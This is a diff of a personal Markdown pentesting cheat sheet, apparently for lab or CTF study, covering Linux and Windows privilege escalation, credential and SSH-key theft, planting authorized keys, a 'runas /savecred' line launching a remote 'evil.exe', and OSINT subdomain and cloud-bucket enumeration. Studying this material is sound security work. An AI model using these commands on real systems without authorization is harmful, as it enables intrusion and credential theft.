+  **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
+
   - `/etc/crontab`
   - `/etc/cron.d`
   - `/var/spool/cron/crontabs/root`
 
-### Exposed Credentials
+- SSH keys:  
 
-Next, we can look for files we can read and see if they contain any exposed credentials. Check:
+  - Read: copy it from `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`
 
-- `configuration` files
-- `log` files, 
--  `bash_history` 
 
-Check for **Password Reuse**!! 
+  ```bash
+  $ chmod 600 id_rsa	# More restrictive permission
+  $ ssh root@10.10.10.10 -i id_rsa
+  $ nano id_rsa	# open and copy on your machine
+  ```
 
-### SSH Keys
+  - Write: place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`
 
-#### Read Access
 
-If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server.
+  ```bash
+  ssh-keygen -f key	#Generate a key in the output file key
+  ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
+  ssh root@10.10.10.10 -i key	# Login
+  ```
+
+### Local Network Services
+
+- `netstat -puntal` or `ss -puntal` (access/ tunnel)
+
+
+Look at `LISTEN` ports
+
+- Tunneling
+
 
 ```bash
-$ nano id_rsa	# open and copy on your machine
-$ chmod 600 id_rsa	# More restrictive permission
-$ ssh root@10.10.10.10 -i id_rsa
+ssh -L [LOCAL PORT]:127.0.0.1:[LOCAL PORT] [USER]@[IP] -fN
 ```
-
-In windows they are in 
-
-#### Write Access
-
-We can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`.
 
 ```bash
-ssh-keygen -f key	#Generate a key in the output file key
-ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
-ssh root@10.10.10.10 -i key	# Login
+sudo nmap -p[PORT] 127.0.0.1
 ```
 
+### Local Processes
 
+- `ps -aux | grep [USER, ROOT...]`
+- `ps -aux` look for local databases
+
+### OS 
+
+- Kernel Exploits
+
+- Vulnerable Software: `dpkg -l` 
 
 ## Windows
 
-### Kernel Exploits
+### Users
 
-Unpatched/older versions of Windows
+- Users & Groups
+  - `net user`
+  - `net localgroup`
+  - `net user [USER]`
+- Memberships & Privileges
 
-### Vulnerable Software
+  -  `whoami /all`
+  -  Check non-default groups -> [Exploits](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges)
+  -  Check non-default privileges -> [Exploits](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
+     - `SeDebug`
+     - `SeBackup`
+     - `SeImpersonate` / `SeAssignPrimaryToken`
+     - `SeRestore`
+     - `SeManage`
+  -  [LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to  leverage to perform certain functions, like downloading files or  executing commands in the context of a privileged user
 
-Installed software: `C:\Program Files`  to see what software is installed on the system.
+### Credential Hunting:
 
-### User Privileges
+- Check locations:
 
-- `whoami`
-  - [LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to  leverage to perform certain functions, like downloading files or  executing commands in the context of a privileged user.
-- check Desktop: `cd C:\Users\[USER]\Desktop`
+  - Desktop: `cd C:\Users\[USER]\Desktop`
 
-### Scheduled Tasks
+  - configuration fikes
 
-Scripts that run at specific intervals to carry out a task. To take advantage:
+  - log files
 
-- **Add new scheduled task**
-  - Linux: *Cron Jobs.* If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed.
-    - `/etc/crontab`
-    - `/etc/cron.d`
-    - `/var/spool/cron/crontabs/root`
+  - History `PSReadLine`
 
-### Exposed Credentials
+- Saved passwords `cmdkey /list`
 
-Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows).
+  ````cmd
+  runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+  ````
 
-Look at enum scripts at the beginning.
+- `tree /a /f c:\users`
 
-Check for `Password Reuse`!! 
+### Files
 
-### SSH Keys
+- Readable / Owned web files (for web application)
 
-#### Read Access
+  - SSH keys:  
 
-If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in  `file:///c:/users/[USERNAME]/.ssh/id_rsa`, and use it to log in to the server.
+    - Read: copy it from `file:///c:/users/[USERNAME]/.ssh/id_rsa`
 
-```bash
-$ nano id_rsa	# open and copy on your machine
-$ chmod 600 id_rsa	# More restrictive permission
-$ ssh root@10.10.10.10 -i id_rsa
-```
+      ```bash
+      $ chmod 600 id_rsa	# More restrictive permission
+      $ ssh root@10.10.10.10 -i id_rsa
+      $ nano id_rsa	# open and copy on your machine
+      ```
 
-#### Write Access
+    - Write: place our public key in the user's ssh directory at `file:///c:/users/[USERNAME]/.ssh/authorized_keys`
 
-We can place our public key in the user's ssh directory at `file:///c:/users/[USERNAME]/.ssh/authorized_keys`.
+      ```bash
+      ssh-keygen -f key	#Generate a key in the output file key
+      ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
+      ssh root@10.10.10.10 -i key	# Login
+      ```
 
-```bash
-ssh-keygen -f key	#Generate a key in the output file key
-ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remote folder
-ssh root@10.10.10.10 -i key	# Login
-```
+    
+
+### Local Network Services
+
+- `systeminfo`
+
+### Local Processes
+
+### OS
+
+
+- Kernel Exploits
+
+  - In meterpreter: local exploit suggester module
+- Vulnerable Software:  `C:\Program Files` 
 
 # Transferring files
 
@@ -3031,32 +3248,7 @@ The same procedure holds for the other languages.
 
 
 
-# General Knowledge
-
-## Metasploit
-
-In `msfconsole`:
-
-```bash
-search [exploit]
-use [exploit]
-options
-exploit
-```
-
-To import an exploit from `searchsploit`:
-
-```bash
-searchsploit [exploit]	#get exploit path
-cd ~/.msf4/modules/exploits
-mkdir [exploit path]	# create the full exploit path inside msf
-cd [exploit path]
-searchsploit -m [exploit_number]	# copies the exploit
-msfconsole
-	>use [exploit path]
-```
-
-
+# OSINT
 
 ## Google search
 
@@ -3083,3 +3275,90 @@ msfconsole
 | `..` (range search)     | Finds results within a specified numerical range.            | `site:ecommerce.com "price" 100..500`               | Look for products priced between 100 and 500 on an e-commerce website. |
 | `" "` (quotation marks) | Searches for exact phrases.                                  | `"information security policy"`                     | Find documents mentioning the exact phrase "information security policy". |
 | `-` (minus sign)        | Excludes terms from the search results.                      | `site:news.com -inurl:sports`                       | Search for news articles on news.com excluding sports-related content. |
+
+## Domains
+
+#### DNS Subdomains
+
+1. Manual search:
+
+   - **SSL certificate**
+
+   - **DNS records** (public domain)
+
+     To display all the available DNS records:
+
+     ```bash
+     dig any [DOMAIN]
+     ```
+
+     The records output will be divided in categories:
+
+     - `A` records: We recognize the IP addresses that point to a specific (sub)domain. 
+     - `MX` records: show which mail  server is responsible for managing the emails for the company. 
+     - `NS` records: show which name servers are used to resolve the FQDN to IP addresses. Most hosting  providers use their own name servers, making it easier to identify the hosting provider.
+     - `TXT` records: often contains verification keys for different third-party providers and other security aspects of DNS, such as [SPF](https://datatracker.ietf.org/doc/html/rfc7208), [DMARC](https://datatracker.ietf.org/doc/html/rfc7489), and [DKIM](https://datatracker.ietf.org/doc/html/rfc6376), which are responsible for verifying and confirming the origin of the  emails sent.
+
+   - **Certificate Transparency (CT) logs:**  SSL certificate providers share the CT with the website https://crt.sh/, which stores everything in a database. FOr a deeper search: [Censys](https://search.censys.io/)
+
+     Certificate Transparency (CT) is an Internet security standard for monitoring and auditing the issuance of digital certificates. When an Internet user interacts with a website, a trusted third party  is needed for assurance that the website is legitimate and that the  website's encryption key is valid.
+
+     To look them up from the terminal and filter by unique subdomains:
+
+     ```bash
+      curl -s https://crt.sh/\?q\=[DOMAIN]\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u | tee subdomainlist.txt
+     ```
+
+     Then one can grep the ones with an IP address:
+
+     ```bash
+     for i in $(cat subdomainlist);do host $i | grep "has address" | grep [DOMAIN]| cut -d" " -f4 >> ip-addresses.txt;done
+     ```
+
+     And use [Shodan](https://www.shodan.io/) to find devices and systems permanently connected to the Internet like `Internet of Things` (`IoT`). It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria.
+
+     ```bash
+     for i in $(cat ip-addresses.txt);do shodan host $i;done
+     ```
+
+     Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 
+
+   - `WHOIS` (public)
+
+     ```bash
+     whois [DOMAIN]
+     ```
+
+   - [Wayback Machine](https://web.archive.org/)
+
+     It allows users to "go back in time" and view snapshots of websites as they appeared at various points in their history.
+
+   - Generic Domain Data
+
+     - [Recon-ng](https://github.com/lanmaster53/recon-ng): 
+
+
+       - [theHarvester](https://github.com/laramies/theHarvester): 
+
+
+       - [SpiderFoot](https://github.com/smicallef/spiderfoot): 
+
+
+       - [OSINT Framework](https://osintframework.com/): 
+
+## Cloud Assets
+
+#### Cloud
+
+`Amazon` (`AWS`), `Google` (`GCP`), and `Microsoft` (`Azure`) 
+
+- DNS enumeration:
+
+  Often cloud storage is added to the DNS list when used for administrative purposes by other employees. 
+
+- Google search:
+
+- Third-party providers 
+
+  -  [domain.glass](https://domain.glass) 
+  -  [GrayHatWarfare](https://buckets.grayhatwarfare.com). We can do many different searches, discover AWS, Azure, and GCP cloud  storage, and even sort and filter by file format. Therefore, once we  have found them through Google, we can also search for them on  GrayHatWarefare and passively discover what files are stored on the  given cloud storage. SSH keys could be also leaked here.
